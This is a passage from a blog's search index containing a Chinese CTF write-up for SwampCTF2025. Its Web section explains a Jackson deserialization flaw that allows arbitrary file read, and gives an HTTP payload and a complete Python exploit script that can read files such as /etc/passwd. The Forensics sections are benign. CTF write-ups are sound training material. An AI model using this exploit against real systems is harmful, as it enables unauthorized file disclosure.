<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SwampCTF2025</title>
      <link href="/2025/03/31/swampCTF2025/"/>
      <url>/2025/03/31/swampCTF2025/</url>
      
        <content type="html"><![CDATA[<h1 id="SwampCTF2025-by-Pwn13ss"><a href="#SwampCTF2025-by-Pwn13ss" class="headerlink" title="SwampCTF2025 by Pwn13ss"></a>SwampCTF2025 by Pwn13ss</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Serialies"><a href="#Serialies" class="headerlink" title="Serialies"></a>Serialies</h3><ol><li>Jackson的配置 (JacksonConfig.java)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> ObjectMapper <span class="title function_">objectMapper</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">objectMapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="type">PolymorphicTypeValidator</span> <span class="variable">ptv</span> <span class="operator">=</span> BasicPolymorphicTypeValidator.builder()</span><br><span class="line">        .allowIfSubType(<span class="string">&quot;com.serialies.serialies.Person&quot;</span>)</span><br><span class="line">        .allowIfSubType(<span class="string">&quot;com.serialies.serialies.Address&quot;</span>)</span><br><span class="line">        .allowIfSubType(<span class="string">&quot;com.serialies.serialies.Job&quot;</span>)</span><br><span class="line">        .build();</span><br><span class="line">        objectMapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);</span><br><span class="line">        <span class="keyword">return</span> objectMapper;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码配置了Jackson如何处理多态类型：</p><ul><li><code>activateDefaultTyping</code>允许通过JSON指定具体类型</li><li>虽然使用了<code>PolymorphicTypeValidator</code>进行白名单限制，但允许了三个关键类</li><li>漏洞点：Job类的文件读取功能 (Job.java)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Job</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String company;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> salary;</span><br><span class="line">    <span class="keyword">private</span> String resume; </span><br><span class="line">    <span class="keyword">private</span> String resumeURI;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (resumeURI != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">URI</span> <span class="variable">fileUri</span> <span class="operator">=</span> URI.create(resumeURI);</span><br><span class="line">            <span class="built_in">this</span>.resume = <span class="keyword">new</span> <span class="title class_">String</span>(Files.readAllBytes(Paths.get(fileUri)));</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// getters and setters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键漏洞在<code>init()</code>方法中：</p><ul><li>通过<code>URI.create(resumeURI)</code>创建URI对象</li><li>使用<code>Files.readAllBytes(Paths.get(fileUri))</code>读取文件内容</li><li>没有任何路径验证或限制，可以读取任意文件</li><li>触发点：PersonController (PersonController.java)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/person&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PersonController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Person&gt; persons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">createPerson</span><span class="params">(<span class="meta">@RequestBody</span> Person person)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (person.getAddress() == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Address is required&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (person.getJob() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                person.getJob().init();  <span class="comment">// 漏洞触发点</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Error&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        persons.add(person);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person has been created with ID: &quot;</span> + person.getId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Person&gt; <span class="title function_">getAllPersons</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> persons;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是漏洞链的触发点：</p><ul><li><code>@RequestBody Person person</code>自动反序列化请求体为Person对象</li><li>检查Address是否存在，所以攻击需提供Address对象</li><li>关键点：调用<code>person.getJob().init()</code>，执行文件读取功能</li><li>Person和Address类 (基础结构)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UUID id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> Job job;</span><br><span class="line">    <span class="comment">// ...getters and setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String street;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String state;</span><br><span class="line">    <span class="keyword">private</span> String zipCode;</span><br><span class="line">    <span class="comment">// ...getters and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整攻击链分析</p><ol><li><p><strong>请求处理流程</strong>：</p><ol><li>向<code>/api/person</code>发送POST请求，包含特定结构的JSON</li><li>Spring框架调用Jackson解析JSON为Java对象</li><li>根据<code>@class</code>属性确定具体类型，构造对象的完整类层次结构</li><li>将JSON属性值映射到Java对象属性</li></ol></li><li><p><strong>漏洞利用触发</strong>：</p><ol><li><code>PersonController.createPerson()</code>接收反序列化后的Person对象</li><li>验证Address存在</li><li>执行<code>person.getJob().init()</code></li><li>Job对象的init()方法读取<code>resumeURI</code>指定的文件(如<code>file:///flag</code>)</li></ol></li><li><p><strong>数据获取</strong>：</p><ol><li>文件内容被存储在Job对象的resume属性中</li><li>Controller将Person对象保存在内存列表中</li><li>通过GET请求<code>/api/person</code>可以获取所有Person对象，包括flag内容</li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /api/person HTTP/1.1</span><br><span class="line">Host: chals.swampctf.com:44444</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: application/json</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@class&quot;</span>: <span class="string">&quot;com.serialies.serialies.Person&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;age&quot;</span>: 25,</span><br><span class="line">  <span class="string">&quot;address&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@class&quot;</span>: <span class="string">&quot;com.serialies.serialies.Address&quot;</span>,</span><br><span class="line">    <span class="string">&quot;street&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;city&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;state&quot;</span>: <span class="string">&quot;test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zipCode&quot;</span>: <span class="string">&quot;test&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;job&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;@class&quot;</span>: <span class="string">&quot;com.serialies.serialies.Job&quot;</span>,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Hacker&quot;</span>,</span><br><span class="line">    <span class="string">&quot;company&quot;</span>: <span class="string">&quot;CTF&quot;</span>,</span><br><span class="line">    <span class="string">&quot;salary&quot;</span>: 0,</span><br><span class="line">    <span class="string">&quot;resumeURI&quot;</span>: <span class="string">&quot;file:///flag.txt&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202904714.png" alt="img"></p><p>再去访问这个路由</p><p><a href="http://chals.swampctf.com:44444/api/person">http://chals.swampctf.com:44444/api/person</a></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202913677.png" alt="img"></p><p>下面是完整的Python漏洞利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL (根据实际情况修改)</span></span><br><span class="line">TARGET_URL = <span class="string">&quot;http://localhost:9090&quot;</span>  <span class="comment"># 改为实际CTF服务器地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target_file=<span class="string">&quot;/flag&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    利用Jackson反序列化漏洞读取目标文件内容</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        target_file: 要读取的文件路径，默认为/flag</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 目标: <span class="subst">&#123;TARGET_URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 尝试读取文件: <span class="subst">&#123;target_file&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构造Payload</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;@class&quot;</span>: <span class="string">&quot;com.serialies.serialies.Person&quot;</span>,</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;hacker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">25</span>,</span><br><span class="line">        <span class="string">&quot;address&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@class&quot;</span>: <span class="string">&quot;com.serialies.serialies.Address&quot;</span>,</span><br><span class="line">            <span class="string">&quot;street&quot;</span>: <span class="string">&quot;Hack Street&quot;</span>,</span><br><span class="line">            <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Exploit City&quot;</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span>: <span class="string">&quot;Payload State&quot;</span>,</span><br><span class="line">            <span class="string">&quot;zipCode&quot;</span>: <span class="string">&quot;31337&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;job&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;@class&quot;</span>: <span class="string">&quot;com.serialies.serialies.Job&quot;</span>,</span><br><span class="line">            <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Security Researcher&quot;</span>,</span><br><span class="line">            <span class="string">&quot;company&quot;</span>: <span class="string">&quot;CTF Team&quot;</span>,</span><br><span class="line">            <span class="string">&quot;salary&quot;</span>: <span class="number">1337.0</span>,</span><br><span class="line">            <span class="string">&quot;resumeURI&quot;</span>: <span class="string">f&quot;file://<span class="subst">&#123;target_file&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置请求头</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 步骤1: 发送POST请求创建包含文件内容的Person对象</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 发送漏洞利用请求...&quot;</span>)</span><br><span class="line">        response = requests.post(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/person&quot;</span>,</span><br><span class="line">            data=json.dumps(payload),</span><br><span class="line">            headers=headers</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求失败: <span class="subst">&#123;response.status_code&#125;</span> - <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功创建Person对象: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 步骤2: 获取包含flag的Person对象列表</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 获取Person对象列表...&quot;</span>)</span><br><span class="line">        response = requests.get(<span class="string">f&quot;<span class="subst">&#123;TARGET_URL&#125;</span>/api/person&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 获取失败: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 解析结果</span></span><br><span class="line">        persons = response.json()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> persons:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 没有找到任何Person对象&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 查找最后创建的Person对象并提取flag</span></span><br><span class="line">        latest_person = persons[-<span class="number">1</span>]  <span class="comment"># 假设最后一个就是我们刚创建的</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;job&quot;</span> <span class="keyword">in</span> latest_person <span class="keyword">and</span> <span class="string">&quot;resume&quot;</span> <span class="keyword">in</span> latest_person[<span class="string">&quot;job&quot;</span>]:</span><br><span class="line">            flag_content = latest_person[<span class="string">&quot;job&quot;</span>][<span class="string">&quot;resume&quot;</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[+] 找到文件内容:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag_content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Person对象中没有包含文件内容&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(json.dumps(latest_person, indent=<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 从命令行参数获取目标文件路径，默认为/flag</span></span><br><span class="line">    target_file = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 从命令行参数获取目标URL，默认为上面定义的</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        TARGET_URL = sys.argv[<span class="number">2</span>]</span><br><span class="line">    </span><br><span class="line">    exploit(target_file)</span><br></pre></td></tr></table></figure><p>使用方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本用法 (读取/flag.txt文件)</span></span><br><span class="line">python3 exploit.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目标文件</span></span><br><span class="line">python3 exploit.py /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件和URL</span></span><br><span class="line">python3 exploit.py /flag.txt http://challenge.example.com:9090</span><br></pre></td></tr></table></figure><hr><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Homeword-Help"><a href="#Homeword-Help" class="headerlink" title="Homeword Help"></a>Homeword Help</h3><blockquote><p>I accidently lost some of my class notes! Can you help me recover it? (Note: Unzipped size is 4GB)</p></blockquote><p>FTK挂载，发现一个word文档</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202919249.png" alt="img"></p><p>打开文档，发现flag</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202931787.png" alt="img"></p><blockquote><p>swampCTF{n0thing_i5_3v3r_d3l3t3d}</p></blockquote><h3 id="Preferential-Treatment"><a href="#Preferential-Treatment" class="headerlink" title="Preferential Treatment"></a>Preferential Treatment</h3><blockquote><p>We have an old Windows Server 2008 instance that we lost the password for. Can you see if you can find one in this packet capture?</p></blockquote><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331202954022.png" alt="img"></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203015942.png" alt="img"></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203025504.png" alt="img"></p><blockquote><p>swampCTF{4v3r463_w1nd0w5_53cur17y}</p></blockquote><h3 id="Planetary-Storage"><a href="#Planetary-Storage" class="headerlink" title="Planetary Storage"></a>Planetary Storage</h3><blockquote><p>My friend found this strange file while perusing his computer, but we can’t read it. Can you figure out what it is and get the information from it?</p><p>Difficulty: Easy&#x2F;Medium</p><p>The flag is in the standard format.</p></blockquote><p>附件给了ldb文件</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250331203035428.png" alt="image-20250331194336056"></p><p>用LevelDBDumper解ldb包</p><p><code>.\LevelDBDumper.exe -d &quot;D:\ctf\SwampCTF2025\Forensics\PlanetaryStorage\challenge&quot; -o &quot;D:\ctf\SwampCTF2025\Forensics\PlanetaryStorage\output&quot; -f &quot;db.txt&quot; -t &quot;csv&quot; -q</code></p><ul><li><code>-d</code> 或 <code>--dir</code>：指定包含 <code>.ldb</code> 文件的目录。这是必需的参数。</li><li><code>-o</code> 或 <code>--outputDir</code>：指定输出文件的目录。</li><li><code>-f</code> 或 <code>--outputFile</code>：指定输出文件的文件名。</li><li><code>-t</code> 或 <code>--outputType</code>：指定输出格式，可以是 <code>csv</code> 或 <code>json</code>。</li><li><code>-q</code> 或 <code>--quiet</code>：静默模式，不将键值对输出到控制台。</li><li><code>-b</code> 或 <code>--batch</code>：将所有输出文件合并为一个文件。</li><li><code>-c</code> 或 <code>--clean-output</code>：清理输出文件中的非可视字符。</li><li><code>-z</code> 或 <code>--timezone</code>：指定时区，默认为 UTC。</li></ul><p>提取到内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Key,Value</span><br><span class="line">/_localHeads,&quot;[&#123;&quot;&quot;payload&quot;&quot;:&quot;&quot;eyJrZXkiOiJcIjMzNTc5M2Q1LTRhYzEtNDgyMy05MmM3LWZkM2I1YTZhMmEwN1wiIiwib3AiOiJQVVQiLCJ2YWx1ZSI6ImV5SmtZWFJoSWpwYkluTjNZVzF3UTFSR2V6RndaalV0WWpRMU0yUXRaRFEzTkdJME5UTjlJbDBzSW1sa0lqb2lYQ0l6TXpVM09UTmtOUzAwWVdNeExUUTRNak10T1RKak55MW1aRE5pTldFMllUSmhNRGRjSWlKOSJ9&quot;&quot;,&quot;&quot;id&quot;&quot;:&quot;&quot;/orbitdb/bafyreiejrtaennxufa3wvkdvyoj6ywq6nid3lukdqcnx2fc33tckzjzbke/ctf&quot;&quot;,&quot;&quot;next&quot;&quot;:[&#123;&quot;&quot;/&quot;&quot;:&quot;&quot;bafyreibbadm2ajrr6io6ufqidibrpdjfpdyfobp2aqvmcprqu5yrk7mq6q&quot;&quot;&#125;],&quot;&quot;refs&quot;&quot;:[&#123;&quot;&quot;/&quot;&quot;:&quot;&quot;bafyreiesvykh6wt7hn4fry4mphv6ckxr5wq3c2fecvcjbqs4scbkizc6jm&quot;&quot;&#125;,&#123;&quot;&quot;/&quot;&quot;:&quot;&quot;bafyreihq7osywkglsjxn5lmbegtc7izqmb66atx5trkrpcmlvtcyrr6nuy&quot;&quot;&#125;,&#123;&quot;&quot;/&quot;&quot;:&quot;&quot;bafyreiab6do7qxgjipiypoj754vicpuscejf43eguvo2ykb2igoyrtkl64&quot;&quot;&#125;],&quot;&quot;v&quot;&quot;:2,&quot;&quot;key&quot;&quot;:&quot;&quot;BJx/DXfZOVG6YkoHDGQvNQVMBaoeaEdEvcKFJP0PM1m3h9/o8lJgnTQkqGCAKovuOCovsDHQ5JOVs7qpJm3V8Ks=&quot;&quot;,&quot;&quot;sig&quot;&quot;:&quot;&quot;MEQCIF5FwOBiQKgEI7njg6He6iAlwNc+Gj8+PAll5o1PCGhKAiBlnXg9+hinX6AGB2r0uXoJ3q9Tbe6azh9euPx40G8uqw==&quot;&quot;,&quot;&quot;identity&quot;&quot;:&#123;&quot;&quot;id&quot;&quot;:&quot;&quot;02020192715ea41d7eaaceb4bd19516d0d4f1e8a2e81903480083dbdbe99dfefc9&quot;&quot;,&quot;&quot;publicKey&quot;&quot;:&quot;&quot;BJx/DXfZOVG6YkoHDGQvNQVMBaoeaEdEvcKFJP0PM1m3h9/o8lJgnTQkqGCAKovuOCovsDHQ5JOVs7qpJm3V8Ks=&quot;&quot;,&quot;&quot;signatures&quot;&quot;:&#123;&quot;&quot;id&quot;&quot;:&quot;&quot;MEQCIGx+GRqmTfPqcUL28aG2p1Q2TNEfZ9QlCgB8WU4my68UAiBZClP9WMe385COJ0WuNnXRj7BIolRC2v6vhLqUt3Yk/w==&quot;&quot;,&quot;&quot;publicKey&quot;&quot;:&quot;&quot;MEQCIFC+7AikjMLabNvdHiHh7rwrFTbystu6xc2r1h/1Zr4jAiBFxjxIMNjfI5J996HDYEQd+fnaKDi5GlNw5hgl+RwEOg==&quot;&quot;&#125;,&quot;&quot;type&quot;&quot;:&quot;&quot;orbitdb&quot;&quot;,&quot;&quot;Provider&quot;&quot;:null&#125;,&quot;&quot;hash&quot;&quot;:&#123;&quot;&quot;/&quot;&quot;:&quot;&quot;bafyreihq6d33ifjj6jbmjptygyksgwzcrjm5kxarbbp6djbzqx2exij27u&quot;&quot;&#125;,&quot;&quot;clock&quot;&quot;:&#123;&quot;&quot;id&quot;&quot;:&quot;&quot;BJx/DXfZOVG6YkoHDGQvNQVMBaoeaEdEvcKFJP0PM1m3h9/o8lJgn